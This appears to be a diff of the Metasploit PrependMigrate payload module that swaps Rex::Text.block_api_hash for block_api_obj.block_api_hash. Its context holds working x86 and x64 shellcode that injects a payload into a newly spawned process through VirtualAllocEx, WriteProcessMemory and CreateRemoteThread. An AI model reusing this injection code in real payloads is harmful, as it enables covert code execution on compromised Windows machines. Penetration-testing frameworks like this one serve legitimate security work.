@@ -70,21 +70,21 @@ module Msf::Payload::Windows::PrependMigrate
     exitblock = %Q^
       ;sleep
       push -1
-      push #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}           ; hash( "kernel32.dll", "Sleep" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "Sleep")}           ; hash( "kernel32.dll", "Sleep" )
       call ebp                  ; Sleep( ... );
     ^
     
     # Check to see if we can find exitfunc in the payload
     exitfunc_block_asm = %Q^
     exitfunk:
-      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}    ; The EXITFUNK as specified by user... kernel32.dll!ExitThread
-      push #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}        ; hash( "kernel32.dll", "GetVersion" )
+      mov ebx, #{block_api_obj.block_api_hash("kernel32.dll", "ExitThread")}    ; The EXITFUNK as specified by user... kernel32.dll!ExitThread
+      push #{block_api_obj.block_api_hash("kernel32.dll", "GetVersion")}        ; hash( "kernel32.dll", "GetVersion" )
       call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
       cmp al, 6         ; If we are not running on Windows Vista, 2008 or 7
       jl goodbye       ; Then just call the exit function...
       cmp bl, 0xE0            ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
       jne goodbye      ;
-      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
+      mov ebx, #{block_api_obj.block_api_hash("ntdll.dll", "RtlExitUserThread")}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
     goodbye:  
       push 0x0            ; push the exit function parameter
       push ebx               ; push the hash of the exit function
@@ -135,7 +135,7 @@ module Msf::Payload::Windows::PrependMigrate
       add esp,-400              ; adjust the stack to avoid corruption
       lea edx,[esp+0x60]
       push edx
-      push #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}           ; hash( "kernel32.dll", "GetStartupInfoA" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "GetStartupInfoA")}           ; hash( "kernel32.dll", "GetStartupInfoA" )
       call ebp                  ; GetStartupInfoA( &si );
 
       lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
@@ -158,7 +158,7 @@ module Msf::Payload::Windows::PrependMigrate
       push esi                  ; lpCommandLine
       push ebx                  ; lpApplicationName
 
-      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}           ; hash( "kernel32.dll", "CreateProcessA" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "CreateProcessA")}           ; hash( "kernel32.dll", "CreateProcessA" )
       call ebp                  ; CreateProcessA( &si );
 
       ; if we didn't get a new process, use this one
@@ -186,7 +186,7 @@ module Msf::Payload::Windows::PrependMigrate
       xor ebx,ebx
       push ebx                  ; address
       push [edi]                ; handle
-      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")} ; hash( "kernel32.dll", "VirtualAllocEx" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "VirtualAllocEx")} ; hash( "kernel32.dll", "VirtualAllocEx" )
       call ebp                  ; VirtualAllocEx( ...);
 
       ; eax now contains the destination
@@ -198,7 +198,7 @@ module Msf::Payload::Windows::PrependMigrate
       begin_of_payload_return:  ; lpBuffer
       push eax                  ; lpBaseAddress
       push [edi]                ; hProcess
-      push #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")} ; hash( "kernel32.dll", "WriteProcessMemory" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "WriteProcessMemory")} ; hash( "kernel32.dll", "WriteProcessMemory" )
       call ebp                  ; WriteProcessMemory( ...)
 
       ; run the code (CreateRemoteThread())
@@ -210,7 +210,7 @@ module Msf::Payload::Windows::PrependMigrate
       push ebx                  ; stacksize
       push ebx                  ; lpThreadAttributes
       push [edi]
-      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")} ; hash( "kernel32.dll", "CreateRemoteThread" )
+      push #{block_api_obj.block_api_hash("kernel32.dll", "CreateRemoteThread")} ; hash( "kernel32.dll", "CreateRemoteThread" )
       call ebp                  ; CreateRemoteThread( ...);
 
       #{exitblock}              ; jmp to exitfunc or long sleep
@@ -244,21 +244,21 @@ module Msf::Payload::Windows::PrependMigrate
       ;sleep
       xor rcx,rcx
       dec rcx                   ; rcx = -1
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}      ; hash( "kernel32.dll", "Sleep" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "Sleep")}      ; hash( "kernel32.dll", "Sleep" )
       call rbp                  ; Sleep( ... );
     EOS
 
     exitfunc_block_asm = %Q^
     exitfunk:
-      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}   ; The EXITFUNK as specified by user...
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}  ; hash( "kernel32.dll", "GetVersion" )
+      mov ebx, #{block_api_obj.block_api_hash("kernel32.dll", "ExitThread")}   ; The EXITFUNK as specified by user...
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "GetVersion")}  ; hash( "kernel32.dll", "GetVersion" )
       call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)
       add rsp, 40           ; cleanup the default param space on stack
       cmp al, 0x6           ; If we are not running on Windows Vista, 2008 or 7
       jl goodbye            ; Then just call the exit function...
       cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
       jne goodbye           ;
-      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
+      mov ebx, #{block_api_obj.block_api_hash("ntdll.dll", "RtlExitUserThread")}   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
     goodbye:                ; We now perform the actual call to the exit function
       push 0x0              ;
       pop rcx               ; set the exit function parameter
@@ -311,7 +311,7 @@ module Msf::Payload::Windows::PrependMigrate
       ; get our own startupinfo at esp+0x60
       add rsp,-400              ; adjust the stack to avoid corruption
       lea rcx,[rsp+0x30]
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}       ; hash( "kernel32.dll", "GetStartupInfoA" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "GetStartupInfoA")}       ; hash( "kernel32.dll", "GetStartupInfoA" )
       call rbp                  ; GetStartupInfoA( &si );
 
       jmp getcommand
@@ -333,7 +333,7 @@ module Msf::Payload::Windows::PrependMigrate
       mov r8, rcx               ; lpProcessAttributes
       mov rdx, rsi              ; lpCommandLine
       ; rcx is already zero     ; lpApplicationName
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}      ; hash( "kernel32.dll", "CreateProcessA" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "CreateProcessA")}      ; hash( "kernel32.dll", "CreateProcessA" )
       call rbp                  ; CreateProcessA( &si );
 
       ; if we didn't get a new process, use this one
@@ -363,7 +363,7 @@ module Msf::Payload::Windows::PrependMigrate
     migrate_asm << <<-EOS
       xor rdx,rdx               ; address
       mov rcx, [rdi]            ; handle
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")}       ; hash( "kernel32.dll", "VirtualAllocEx" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "VirtualAllocEx")}       ; hash( "kernel32.dll", "VirtualAllocEx" )
       call rbp                  ; VirtualAllocEx( ...);
 
       ; eax now contains the destination - save in ebx
@@ -377,7 +377,7 @@ module Msf::Payload::Windows::PrependMigrate
       pop r8                    ; lpBuffer
       mov rdx, rax              ; lpBaseAddress
       mov rcx, [rdi]            ; hProcess
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")}      ; hash( "kernel32.dll", "WriteProcessMemory" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "WriteProcessMemory")}      ; hash( "kernel32.dll", "WriteProcessMemory" )
       call rbp                  ; WriteProcessMemory( ...);
 
       ; run the code (CreateRemoteThread())
@@ -389,7 +389,7 @@ module Msf::Payload::Windows::PrependMigrate
       mov r8, rcx               ; stacksize
       ;rdx already equals 0     ; lpThreadAttributes
       mov rcx, [rdi]
-      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")}      ; hash( "kernel32.dll", "CreateRemoteThread" )
+      mov r10d, #{block_api_obj.block_api_hash("kernel32.dll", "CreateRemoteThread")}      ; hash( "kernel32.dll", "CreateRemoteThread" )
       call rbp                  ; CreateRemoteThread( ...);
 
       #{exitblock}              ; jmp to exitfunc or long sleep
